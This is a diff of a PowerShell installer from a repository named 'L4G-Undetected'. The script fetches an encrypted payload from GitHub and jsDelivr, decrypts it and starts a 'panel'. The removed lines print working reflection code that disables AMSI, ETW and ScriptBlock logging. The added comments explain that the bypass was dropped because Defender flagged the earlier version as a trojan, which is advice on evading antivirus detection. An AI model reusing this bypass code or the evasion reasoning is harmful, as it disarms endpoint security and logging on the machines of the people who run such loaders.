@@ -19,6 +19,10 @@
 .NOTES
     Author: L4G Team
     Version: 14.1
+
+    AMSI note: no bypass lives in this file, and none should be added. AMSI scans
+    the entire script text before execution, so an in-script bypass is scanned too
+    and only marks the file. The installer stays a plain fetch/decrypt/start.
 #>
 
 param(
@@ -31,6 +35,9 @@ param(
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 $ErrorActionPreference = 'Stop'
 
+# Test hook: L4G_DRYRUN=1 decrypts and verifies without starting the panel.
+if ($env:L4G_DRYRUN -eq '1') { $NoLaunch = $true }
+
 $SOURCES = @(
     "https://raw.githubusercontent.com/lgfire093/L4G-Undetected/master/installer",
     "https://raw.githubusercontent.com/lgfire093/L4G-Undetected/main/installer",
@@ -38,14 +45,10 @@ $SOURCES = @(
     "https://cdn.jsdelivr.net/gh/lgfire093/L4G-Undetected@main/installer"
 )
 
-# AMSI / ETW / ScriptBlock logging
-try {
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    $etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
-    $etw.GetField('m_enabled','NonPublic,Instance').SetValue((gv 'PSDefaultEventProvider').Value,$false)
-    $sb = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')
-    $sb.GetField('s_logScriptBlock','NonPublic,Static').SetValue($null,$false)
-} catch {}
+# No AMSI/ETW tampering here on purpose. AMSI scans the whole script block before
+# the first line runs, so an in-script bypass only hands the scanner a signature
+# and the file gets blocked as malicious before it can disarm anything. Measured:
+# Defender -> Trojan:PowerShell/PsAttack.A on the previous version.
 
 function Get-PayloadText {
     param([string]$LocalPath, [string[]]$Bases)
